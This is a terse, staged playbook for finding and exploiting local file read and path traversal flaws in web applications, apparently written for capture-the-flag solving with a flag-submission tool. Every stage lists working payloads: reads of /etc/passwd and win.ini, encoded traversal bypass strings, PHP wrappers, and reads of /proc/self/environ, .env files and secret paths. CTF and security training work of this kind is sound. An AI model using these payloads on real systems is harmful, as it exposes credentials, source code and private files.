# Field Manual — the ordered playbook

## Stage 0 — fingerprint the read-sink

- which param names a file — `?file=`/`?path=`/`?doc=`/`?view=`/`?template=`/
  `?page=`/`?include=`/`?load=`/`?read=`/`?img=`/`?src=`/`?content=`/
  `?name=`/`?download=`/`?open=`/`?show=`/`?filename=`/`?filepath=`/
  `?resource=`/`?location=`/`?uri=`/`?url=`/`?doc_name=`/`?docname=`
- the sink-type: `file_get_contents`/`readfile`/`include`/`file_exists`/
  `filesize`/`md5_file`/`getimagesize`/`finfo_file`/`require`/`load`/
  `fs.readFile`/`open`/`sendFile`/`send_from_directory`/`FileInputStream`/
  `Files.read*`/`getResourceAsStream`/`File.Read*`/`MapPath`/`WriteFile`
  — the sink names the primitive-shape

## Stage 1 — the canary — prove the read

```
?file=/etc/passwd       → root:x:0:0: → confirms
?file=/etc/hostname     → the hostname → confirms
?file=C:\Windows\win.ini → [fonts] → confirms
?file=/nonexistent      → the error is the oracle
```

The canary is a file EVERY system has — `passwd`/`hostname`/`win.ini` —
verbatim content = the read works.

## Stage 2 — the sink-type check — read vs exec vs oracle

- content echoes → read-sink — flag is a file
- file's content parsed → include/exec-sink — `read-to-rce.md`
- a hash/size/mime echoes → oracle-sink — `blind-read.md`
- a listing echoes → listing-sink — `glob`/`scandir`

## Stage 3 — the traversal-syntax check — absolute-first

```
?file=/etc/passwd       → works → absolute-path is live — NO traversal needed
?file=../../etc/passwd  → works → traversal live
?file=../../etc/passwd  → fails + absolute works → confined
```

Absolute-first — `path.join`/`resolve` absolute-wins on many stacks —
traversal is only needed when the join is a `base + relative` confine.

## Stage 4 — the encoding check — the filter-family

- `..%2f`/`%2e%2e%2f`/`..%5c`/`%252e%252e%252f`/`....//`/`..%c0%af`/
  `..%ef%bc%8f`/`..;/`/`%00` — the encoding family — `encoding-tricks.md`
- the oracle: the ERROR tells you which layer stripped what —
  `sanitizer_fuzz.py` if needed — `filter-bypass.md`

## Stage 5 — the stack check — the lang-frame

- `.php` → `php://filter`/`phar://`/`include`/`expect://`/`ssh2.*`/
  `data:`/`zip://`/`glob://` — `php-wrappers.md`/`per-stack.md`
- `.py`/`.pyw` → `open`/`Path.read`/`send_file`/`FileResponse` —
  `per-stack.md`
- `.js`/`.node` → `fs.readFile`/`sendFile`/`require` — `per-stack.md`
- `.java`/`.jsp`/`.do`/`.action`/`.class` → `FileInputStream`/`Files.read*`/
  `getResourceAsStream`/`jar:`/`netdoc:` — `per-stack.md`
- `.rb` → `File.read`/`IO.read`/`send_file`/`render file:` — `per-stack.md`
- `.go` → `os.ReadFile`/`os.Open`/`ServeFile` — `per-stack.md`
- `.cs`/`.aspx`/`.ashx`/`.asmx`/`.asax` → `File.Read*`/`MapPath`/
  `WriteFile`/`VirtualPathProvider` — `per-stack.md`

## Stage 6 — the confine check — the boundary

- `open_basedir` → `Warning: open_basedir restriction in effect`
- `realpath + startswith` → a `..` resolves out but the prefix-check kills
- `chroot` → `/proc/self/root/` is the escape
- `send_from_directory`/`safe_join`/`MapPath` — the framework-confine
- `SecManager`/`AccessController` — Java
- `AppArmor`/`SELinux`/`seccomp` — LSM
- `Uid`/`Gid` + `Perm denied` — the perm-confine

`denied-conditions.md` — the wall-list.

## Stage 7 — the self-recon — `/proc/self/*`

```
?file=/proc/self/environ     — FLAG? env-vars?
?file=/proc/self/cmdline     — the app path
?file=/proc/self/cwd         — the working dir
?file=/proc/self/exe         — the interpreter
?file=/proc/self/mountinfo   — the mount-set
?file=/proc/self/status      — uid/gid/caps
?file=/proc/self/maps        — memory regions
?file=/proc/self/fd/0..20    — the open-fds
?file=/proc/net/tcp          — listening
?file=/proc/net/arp          — neighbors
```

The self-view names the app's path/env/uid — the next-read list.

## Stage 8 — the source-read — the app source

`?file=<app-path>` from `cmdline`/`cwd` — `main.py`/`server.js`/
`index.php`/`app.py`/`wsgi.py`/`routes.rb`/`web.xml`/`web.config` —
`source-location.md` for the per-stack list — the source names the
flag-path.

## Stage 9 — the flag-path read — the flag

`?file=<flag-path>` from the source — `/flag`/`/app/flag`/`.env`/
`/proc/1/environ`/`/run/secrets/flag` — `flag-paths.md` — the flag.

## Stage 10 — the pre-flag — `hooks.py pre-flag`

```bash
python3 tools/hooks.py pre-flag <name> \
  --value "flag{...}" --source "<the path>"
```

The gate decides — the flag is verbatim in `--response`.

## Stage 11 — the write-back — record the solve

`post-probe --verdict confirms` + `classify_solve` + the chain-card —
the solve is recorded.

## The "the ladder is bounded" — the budget

5 attempts / 35-min hint / 3-stuck → pivot — `read-pipeline.md` — the
rung-order is the budget's shape.

## The "the kill-map is a result" — the honest record

A `refutes` + the kill-map (which rungs died + why) — the next attempt
doesn't re-walk the dead layers.
